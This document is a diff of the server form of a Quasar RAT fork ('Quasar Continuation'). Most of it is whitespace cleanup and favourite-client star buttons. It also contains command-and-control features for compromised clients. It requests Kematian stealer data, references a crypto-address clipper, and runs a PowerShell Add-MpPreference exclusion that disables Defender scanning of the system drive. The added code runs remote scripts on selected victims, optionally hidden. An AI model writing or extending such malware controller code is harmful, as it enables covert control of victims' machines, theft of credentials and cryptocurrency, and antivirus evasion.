@@ -191,12 +191,12 @@ namespace Quasar.Server.Forms
                     break;
                 }
             }
-            
+
             if (accountTypeIndex >= 0)
             {
                 lstClients.StretchColumnByIndex(accountTypeIndex);
             }
-            
+
             EventLog("Welcome to Quasar Continuation.", "info");
             InitializeServer();
             AutostartListening();
@@ -217,7 +217,7 @@ namespace Quasar.Server.Forms
             BCHTextBox.TextChanged += CryptoTextBox_TextChanged;
 
             ClipperCheckbox.CheckedChanged += ClipperCheckbox_CheckedChanged2;
-            
+
             lstClients.ColumnWidthChanging += lstClients_ColumnWidthChanging;
         }
 
@@ -502,20 +502,20 @@ namespace Quasar.Server.Forms
                         new KematianHandler(client).RequestKematianZip();
                         break;
                     case "Exclude System Drives":
-                    string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
+                        string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
                         if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
                         {
                             client.Send(new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" });
                         }
                         break;
                     case "Message Box":
-                    client.Send(new DoShowMessageBox
-                    {
-                        Caption = subItem0,
-                        Text = subItem1,
-                        Button = "OK",
-                        Icon = "None"
-                    });
+                        client.Send(new DoShowMessageBox
+                        {
+                            Caption = subItem0,
+                            Text = subItem1,
+                            Button = "OK",
+                            Icon = "None"
+                        });
                         break;
                 }
             }
@@ -658,7 +658,7 @@ namespace Quasar.Server.Forms
                                         break;
                                     }
                                 }
-                                
+
                                 if (!found)
                                 {
                                     AddStarButton(item, client);
@@ -685,13 +685,13 @@ namespace Quasar.Server.Forms
                 Cursor = Cursors.Hand
             };
 
-            starButton.Image = Favorites.IsFavorite(client.Value.UserAtPc) ? 
+            starButton.Image = Favorites.IsFavorite(client.Value.UserAtPc) ?
                 Properties.Resources.star_filled : Properties.Resources.star_empty;
-            
+
             starButton.Click += StarButton_Click;
-            
+
             lstClients.Controls.Add(starButton);
-            
+
             UpdateStarButtonPosition(starButton, item);
             starButton.BringToFront();
         }
@@ -709,13 +709,13 @@ namespace Quasar.Server.Forms
             if (sender is Control starControl && starControl.Tag is Client client)
             {
                 Favorites.ToggleFavorite(client.Value.UserAtPc);
-                
+
                 if (starControl is Button button)
                 {
-                    button.Image = Favorites.IsFavorite(client.Value.UserAtPc) ? 
+                    button.Image = Favorites.IsFavorite(client.Value.UserAtPc) ?
                         Properties.Resources.star_filled : Properties.Resources.star_empty;
                 }
-                
+
                 SortClientsByFavoriteStatus();
             }
         }
@@ -723,21 +723,21 @@ namespace Quasar.Server.Forms
         private void SortClientsByFavoriteStatus()
         {
             lstClients.BeginUpdate();
-            
+
             // Remove all star buttons first
             var controlsToRemove = lstClients.Controls.Cast<Control>()
                 .Where(c => c is Button && c.Tag is Client)
                 .ToList();
-            
+
             foreach (var control in controlsToRemove)
             {
                 lstClients.Controls.Remove(control);
             }
-            
+
             // Separate favorited and unfavorited clients
             List<ListViewItem> favoritedItems = new List<ListViewItem>();
             List<ListViewItem> unfavoritedItems = new List<ListViewItem>();
-            
+
             foreach (ListViewItem item in lstClients.Items)
             {
                 if (item.Tag is Client client)
@@ -748,17 +748,17 @@ namespace Quasar.Server.Forms
                         unfavoritedItems.Add(item);
                 }
             }
-            
+
             // Clear the ListView
             lstClients.Items.Clear();
-            
+
             // Add favorited items first, then unfavorited
             foreach (var item in favoritedItems)
                 lstClients.Items.Add(item);
-            
+
             foreach (var item in unfavoritedItems)
                 lstClients.Items.Add(item);
-            
+
             // Add star buttons back for each client in the correct order
             foreach (ListViewItem item in lstClients.Items)
             {
@@ -767,7 +767,7 @@ namespace Quasar.Server.Forms
                     AddStarButton(item, client);
                 }
             }
-            
+
             lstClients.EndUpdate();
         }
 
@@ -820,13 +820,13 @@ namespace Quasar.Server.Forms
                             // Remove star button
                             var controlsToRemove = lstClients.Controls.Cast<Control>().Where(
                                 c => c.Tag is Client buttonClient && buttonClient.Equals(client)).ToList();
-                            
+
                             foreach (var control in controlsToRemove)
                             {
                                 lstClients.Controls.Remove(control);
                                 control.Dispose();
                             }
-                            
+
                             lvi.Remove();
                             break;
                         }
@@ -1609,12 +1609,12 @@ namespace Quasar.Server.Forms
                     break;
                 }
             }
-            
+
             if (accountTypeIndex >= 0)
             {
                 lstClients.StretchColumnByIndex(accountTypeIndex);
             }
-            
+
             UpdateAllStarPositions();
         }
 
@@ -1686,7 +1686,7 @@ namespace Quasar.Server.Forms
         }
 
         private void lstClients_ColumnWidthChanged(object sender, ColumnWidthChangedEventArgs e)
-        { 
+        {
             if (!lstClients.IsStretched(hAccountType.Index))
             { lstClients.StretchColumnByIndex(hAccountType.Index); }
             UpdateAllStarPositions();
@@ -1704,6 +1704,30 @@ namespace Quasar.Server.Forms
         private void lstClients_DrawItem(object sender, DrawListViewItemEventArgs e)
         {
             e.DrawDefault = true;
+     
+        
+        }
+
+        private void remoteScriptingToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                using (var frm = new FrmRemoteScripting(lstClients.SelectedItems.Count))
+                {
+                    if (frm.ShowDialog() == DialogResult.OK)
+                    {
+                        foreach (Client c in GetSelectedClients())
+                        {
+                            c.Send(new DoExecScript
+                            {
+                                Language = frm.Lang,
+                                Script = frm.Script,
+                                Hidden = frm.Hidden
+                            });
+                        }
+                    }
+                }
+            }
         }
     }
 }
